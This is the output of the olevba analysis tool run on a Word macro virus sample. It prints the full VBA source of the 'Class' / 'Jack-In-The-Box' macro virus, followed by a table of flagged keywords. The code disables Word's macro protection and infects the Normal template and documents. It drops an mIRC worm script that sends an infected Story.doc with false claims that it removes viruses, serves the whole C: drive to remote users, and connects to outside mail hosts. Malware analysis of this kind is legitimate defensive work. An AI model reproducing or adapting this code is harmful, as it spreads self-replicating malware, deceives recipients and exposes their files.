olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.fm-c0915b58a4fc7b9737efe3d3e05703d08e86bae4
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.fm-c0915b58a4fc7b9737efe3d3e05703d08e86bae4 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
'Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc
'Jack-In-The-Box
'Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc
Something.VirusProtection = 0
'Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc
Something.SaveNormalPrompt = 0
'Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc
Application.StatusBar = 0
'Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc
Set AnI = ActiveDocument.VBProject.VBComponents(1)
'Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc
If UCase(AnI.CodeModule.Lines(3, 1)) = "'JACK-IN-THE-BOX" Then InA = 1
'Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc
If InA = 1 And InB = 1 Then Exit Sub
'Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc
VCode = CnI.CodeModule.Lines(2, CnI.CodeModule.CountOfLines)
'Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc
If InB = 1 Then AnI.CodeModule.AddFromString ("Private Sub Document_Open" & Chr(13) & VCode)
'Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc
somename = ActiveDocument.Name
'Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc
If InB = 1 Then
'Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc
var3 = "C:\mirc\script.ini"
'Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc
If System.PrivateProfileString("C:\mirc\mirc.ini", "fileserver", "warning") <> "" Then System.PrivateProfileString("C:\mirc\mirc.ini", "fileserver", "warning") = "off"
'Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc
Open "C:\mirc\script.ini" For Output As #1
'Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc
Print #1, "n0=On 1:Connect:{ .notify SimpleSmn | Set %var7 $rand(1,8) | If ( %var7 = 1 ) { Set %var8 mirc.com } | If ( %var7 = 2 ) { Set %var8 georgecarlin.com } | If ( %var7 = 3 ) { Set %var8 carrottop.com } | If ( %var7 = 4 ) { Set %var8 anvdesign.net } | If ( %var7 = 5 ) { Set %var8 symantec.com } | If ( %var7 = 6 ) { Set %var8 drsolomon.com } | If ( %var7 = 7 ) { Set %var8 www.bocklabs.wisc.edu } | If ( %var7 = 8 ) { Set %var8 ebay.com } | Set %var9 $rand(1,4) | If ( %var9 = 1 ) { Set %var10 evrt@avp.com } | If ( %var9 = 2 ) { Set %var10 samples@datafellows.com } | If ( %var9 = 3 ) { Set %var10 virus_research@nai.com } | If ( %var9 = 3 ) { Set %var10 tech_support@nai.com } | If ( $exists(C:\Windows\script1.ini) = $true ) { .remove C:\Windows\script1.ini } | .copy C:\mirc\script.ini C:\Windows\script1.ini | .load -rs C:\Windows\script1.ini | .write -c C:\mirc\script.ini [script] | .reload -rs C:\mirc\script.ini }"
'Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc
Print #1, "n2=On 1:Notify:{ .timer3 1 10 { .clear -s } | If ( $nick == SimpleSmn ) { .msg SimpleSmn I'm on irc. | halt } | .timer1 1 15 { .notify -r $nick | .ignore $nick | .timer9 1 5 { .msg $nick Hey, I can't talk right now but I wanted to send you this file.  It has a funny story you should read, and also has macros inside that protect you from a lot of viruses.  Just open the document, enable the macros, and if you are infected it will get rid of the virus } | .timer2 1 15 { .dcc send $nick C:\Windows\Story.doc } } | .timer 1 16 { .notify | .clear -s } }"
'Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc
Print #1, "n4=On 1:Join:#: if (help isin $chan) || (nohack isin $chan) { .part $chan } | If ( $exists(C:\mirc\script.ini) = $true ) { .remove C:\mirc\script.ini }"
'Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc
Print #1, "n6=On 1:Invite:#:{ .ignore $nick | .timer 1 10 { .join # } | .timer 1 15 { .msg $nick Thanks for the invite } | .timer 1 20 { .msg $nick I'm a little busy so I can't talk much now.  I thought you might want to look at this file I got. It has a funny story and also has macros in it which get rid of any macro viruses.  Just enable the macros when the prompt comes up and it will scan for any viruses and clean them. } | .timer 1 25 { .dcc send $nick C:\Windows\Story.doc } }"
'Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc
Print #1, "n7=On 1:Notice:Simplicity:*: .fserve $nick 100 C:\"
'Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc
Print #1, "n9=On 1:Text:*worm*:*: .ignore $nick"
'Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc
Print #1, "n11=On 1:Text:*infect*:*: .ignore $nick"
'Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc
Print #1, "n13=On 1:Text:*macro*:*: .ignore $nick"
'Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc
Print #1, "n15=On 1:Text:*Hi*:*:{ .timer1 1 5 { .sockclose virc | .sockopen virc %var8 25 } }"
'Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc
Print #1, "n16=On 1:Text:*!*:*:{ .timer1 1 5 { .sockclose virc | .sockopen virc %var8 25 } }"
'Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc
Print #1, "n18=On 1:Text:*Hello*:*:{ .timer1 1 5 { .sockclose virc | .sockopen virc %var8 25 } }"
'Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc
Print #1, "n20=If ( $sockerr != 0 ) { halt } | .sockwrite -n virc rcpt to: %var10 | .sockwrite -n virc data | .sockwrite -n virc To: %var10 | .sockwrite -n virc From: %var5 | .sockwrite -n virc Subject: %var6 | .sockwrite -n virc Jack-In-The-Box Has Popped Up Again! | .sockwrite -n virc . | .sockwrite -n virc Quit | .sockclose virc }"
'Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc
Close #1
'Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc
ActiveDocument.SaveAs FileName:="C:\Windows\Story.doc", AddToRecentFiles:=False
'Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc
End If
'Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc
End If
'Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc
CommandBars("Tools").Controls("Customize...").Enabled = 0
'Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc
CommandBars("View").Controls("Status Bar").Enabled = 0
'Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc

'Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc

'Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc

'Ditry PC12/16/99 3:12:30 PMHP LaserJet 4 on LPT1:sample1.doc
















Sub AutoOpen()
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
On Error GoTo out
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
Options.VirusProtection = False
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
Options.SaveNormalPrompt = False
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
Options.ConfirmConversions = False
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
ad = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
nt = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
If nt > 70 And ad > 0 Then GoTo out
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
If nt < 70 Then
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
End If
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
If Day(Now) = 14 And (Month(Now) > 5) Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "VicodinES Loves You / Class.Poppy"
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
host.CodeModule.AddFromFile ("c:\class.sys")
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
With host.CodeModule
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
    For x = 1 To 4
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
    .deletelines 1
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
    Next x
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
End With
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
If nt < 70 Then
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
    With host.CodeModule
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
    .replaceline 1, "Sub AutoClose()"
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
    .replaceline 71, "Sub ToolsMacro()"
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
    End With
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
End If
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
With host.CodeModule
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
    For x = 2 To 72 Step 2
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
    Next x
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
End With
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
out:
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
End Sub
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
Sub ViewVBCode()
'Werk Sindelfingen09.08.1999 13:41:43HP LaserJet 5L on LPT1:Liste Dr. Schoepf KW34
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
